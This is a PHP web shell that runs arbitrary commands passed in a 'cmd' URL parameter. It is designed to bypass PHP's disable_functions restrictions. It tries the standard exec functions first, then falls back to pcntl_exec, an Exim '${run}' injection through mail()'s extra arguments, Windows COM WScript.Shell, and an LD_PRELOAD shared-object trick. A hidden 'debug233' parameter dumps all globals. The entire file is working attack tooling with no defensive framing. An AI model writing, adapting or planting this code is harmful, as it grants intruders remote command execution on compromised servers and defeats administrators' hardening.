<?php

error_reporting(0);

$cmd = isset($_GET['cmd']) ? $_GET['cmd']: $argv[1];
$debug = isset($_GET['debug233'])? $_GET['debug233']: 0;

SetEnvironment();
$directly_functions = CheckDirectlyFunctions();
$directly_classes = CheckDirectlyClasses();

if ($debug === 'debug') {
	var_dump($GLOBALS);
}

if (directly_function_exec($cmd))
	exit(0);

if (count($methods_map) !== 0)
	$methods_map[0][1]($cmd);


//these are the functions we can use to fuck the shit
//$usable_functions = array();

//return the functions that directly call to execute command
function CheckDirectlyFunctions() {
	$directly_functions = array(
		'system',
		'proc_open', 
		'popen', 
		'passthru', 
		'shell_exec', 
		'exec', 
		//'python_eval', 
		//'perl_system'
	);

	$disabled = get_cfg_var("disable_functions");
	if ($disabled) {
		$disable_functions = explode(',', preg_replace('/ /m', '', $disabled));
/*
		$directly_functions = array_filter(
			$directly_functions,
			function ($func) use ($disable_functions){
				if (in_array($func, $disable_functions))
					return false;
				else
					return true;
			}
		);
*/
		$usable_funcs = array();
		foreach ($directly_functions as $func) {
			if (!in_array($func, $disable_functions)) {
				$usable_funcs[] = $func;
			}
		}
	}
	else {
		$usable_funcs = $directly_functions;
	}

	return $usable_funcs;
}


function CheckDirectlyClasses() {
	$directly_classes = array(
		'COM',
		'DOTNET',
	);

	$disabled = get_cfg_var("disable_classes");
	if ($disabled) {
		$disable_classes = explode(',', preg_replace('/ /m', '', $disabled));
/*
		$directly_classes = array_filter(
			$directly_classes,
			function ($cls) use ($disable_classes) {
				if (in_array($cls, $disable_classes))
					return false;
				else
					return true;
			}
		);
*/
		$usable_cls = array();
		foreach($directly_classes as $cls) {
			if (!in_array($cls, $disable_classes)) {
				$usable_cls[] = $cls;
			}
		}
	}
	else {
		$usable_cls = $directly_classes;
	}

	return $usable_cls;
}


function SetEnvironment() {
	if (PHP_OS === 'Linux') {
		$GLOBALS['tmp_dir'] = '/var/tmp/';
	}
	elseif (PHP_OS === 'WINNT') {
		$GLOBALS['tmp_dir'] = getenv('TEMP') . '\\';

		if ($GLOBALS['tmp_dir'] === false) { // you will need if you encounter stupid phpstudy
			$GLOBALS['tmp_dir'] = sprintf('C:\Users\%s\AppData\Local\Temp\\', get_current_user());
		}
	}

	ob_start();
	phpinfo();
	$info = ob_get_contents();
	ob_end_clean();

	if (preg_match('~<tr><td class="e">System </td><td class="v">(.*) </td></tr>~', $info, $matchs))
		$arch = end(preg_split('/ /', $matchs[1]));
	else
		$arch = false;

	if ($arch !== 'x86_64')
		$arch = 'x86_32';

	$GLOBALS['architecture'] = $arch;

	global $methods_map;
	$methods_map = array(
		array("(version_compare(PHP_VERSION, '4.1.9') === 1) && function_exists('pcntl_exec') && PHP_OS !== 'WINNT'", 'php5_pcntl_exec'),
		array("file_exists('/usr/sbin/exim4') && PHP_OS !== 'WINNT' && function_exists('mail')", 'exim_exec'),
		array("class_exists('COM')", 'COM_exec'),
		array("function_exists('mail') && PHP_OS !== 'WINNT'", 'ld_preload_exec')
	);
/*
	$methods_map = array_filter(
		$methods_map,
		function ($method) {
			$cond = $method[0];
			eval("\$isOK = ($cond);");
			if ($isOK)
				return true;
			else
				return false;
		}
	);
*/
	$usable_methods = array();
	foreach ($methods_map as $method) {
		$cond = $method[0];
		eval("\$isOK = ($cond);");
		if ($isOK) {
			$usable_methods[] = $method;
		}
	}

	$methods_map = $usable_methods;
}


function random_str($len = 7) {
	$integer = '0123456789';
	$chars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ'.$integer;
	$chars_len = strlen($chars);
	$result = '';

	for ($i = 0; $i < $len; $i++) {
		$result .= $chars{mt_rand() % $chars_len};
	}

	return $result;
}


function directly_function_exec($cmd) {
	if (count($GLOBALS['directly_functions']) === 0)
		return false;

	//$done = false;
	$result = '';
	foreach ($GLOBALS['directly_functions'] as $func) {
		if ($func === 'exec') {
			@exec($cmd, $result);
			$result = join("\n", $result);

			break;
		}
		elseif ($func === 'popen') {
			if (@is_resource($f = @popen($cmd, "r"))) {
				while (!@feof($f))
					$result .= @fread($f, 1024);

				@pclose($f);
			}

			break;
		}
		elseif ($func === 'shell_exec') {
			$result = @$func($cmd);
			
			break;
		}
		elseif ($func === 'proc_open') {
			$proc = proc_open(
				$cmd,
				array(
					array("pipe", 'r'),
					array('pipe', 'w'),
					array('pipe', 'w')
				),
				$pipes
			);

			$result .= stream_get_contents($pipes[1]);
			$result .= "\n";
			$result .= stream_get_contents($pipes[2]);

			foreach ($pipes as $pipe)
				@fclose($pipe);

			proc_close($proc);

			break;
		}
		else { //system, passthru
			@ob_start();
			@$func($cmd);
			$result = @ob_get_contents();
			@ob_end_clean();

			break;
		}
	}

	echo $result;

	return true;
}


/*
 * limitation:
 * os doesnt support windows
 * PHP 4 >= 4.2.0, PHP 5 pcntl_exec
 *
 * (version_compare(PHP_VERSION, '4.1.9') === 1) && function_exists(pcntl_exec) && PHP_OS !== 'WINNT'
 */
function php5_pcntl_exec($cmd) {
	$tempfile = $GLOBALS['tmp_dir'].random_str();

	$cmd = sprintf("%s > %s;pkill -9 '^sh$'", $cmd, $tempfile);
	$arg = array('-c', $cmd);
	$sh_path = '/bin/sh';

	pcntl_exec($sh_path, $arg);
	echo file_get_contents($tempfile);

	unlink($tempfile);
}


/*
 * limitation:
 * os doesnt support windows(maybe?)
 * sendmail should be the symbol link of exim4
 *
 * file_exists('/usr/sbin/exim4') && PHP_OS !== 'WINNT' && function_exists(mail)
 */
function exim_exec($cmd) {
	$tempfile = $GLOBALS['tmp_dir'].random_str();
	$command_file = $GLOBALS['tmp_dir'].random_str();
	$cmd = "$cmd > $tempfile";

	file_put_contents($command_file, $cmd);
	mail(
		"root@localhost", 
		"aaa",
		"bbb",
		null,
    	'-fwordpress@xenial(tmp1 -be ${run{/bin/sh${substr{10}{1}{$tod_log}}'.$command_file.'}} tmp2)'
    );

    echo file_get_contents($tempfile);

    unlink($command_file);
    unlink($tempfile);
}


/*
 * limitation:
 * only windows
 * php 4 >= 4.1.0, php5
 *
 * (version_compare(PHP_VERSION, '4.0.9') === 1) && (version_compare(PHP_VERSION, '7.0.0') === -1) && PHP_OS === 'WINNT' && class_exists(COM)
 */
function COM_exec($cmd) {
	$runcmd = "C:\\WINDOWS\\system32\\cmd.exe /c {$cmd}";
	try {
		$WshShell = new COM('WScript.Shell');
		$result = $WshShell->Exec($runcmd)->StdOut->ReadAll;
	}
	catch (Exception $e) {
		$tempfile = $GLOBALS['tmp_dir'].random_str();
		$ShellApp = new COM('Shell.Application');
		$cmdfile = 'C:\WINDOWS\system32\cmd.exe';
		$ShellApp->ShellExecute($cmdfile, "/c {$cmd} > {$tempfile}", '', '', 0);

		$result = file_get_contents($tempfile);
		unlink($tempfile);
	}

	echo $result;
}


/*
 * limitation:
 * only linux or unix
 * 
 * function_exists(mail) && PHP_OS !== 'WINNT'
 */
function _ld_preload_exec($cmd, $result_path) {
	$cmd_env = 'ScriptKiddies';
	$shared_file_x86_content = '~x86.so~';
	$shared_file_x64_content = '~x64.so~';
	
	$shared_file_x86 = base64_decode($shared_file_x86_content);
	$shared_file_x64 = base64_decode($shared_file_x64_content);

	$evilso = $GLOBALS['tmp_dir'] . random_str() . '.so';
	if ($GLOBALS['architecture'] === 'x86_64')
		file_put_contents($evilso, $shared_file_x64);
	elseif ($GLOBALS['architecture'] === 'x86_32')
		file_put_contents($evilso, $shared_file_x86);
	else
		return false;

	$result_path = $result_path . '/' . random_str();
	$cmd = '/bin/bash -c ' . escapeshellarg($cmd) . '> ' . $result_path; 

	putenv("LD_PRELOAD={$evilso}");
	putenv("{$cmd_env}={$cmd}");

	mail('', '', '', '', '');
	echo file_get_contents($result_path);

	unlink($evilso);
	unlink($result_path);
}


function ld_preload_exec($cmd) {
	_ld_preload_exec($cmd, '/var/lock'); //result path cant contain 'tmp'... dont know why...
}


function DOTNET_exec($cmd) {
	//to do...
}


function mod_cgi_exec($cmd) {
	//to do...
}
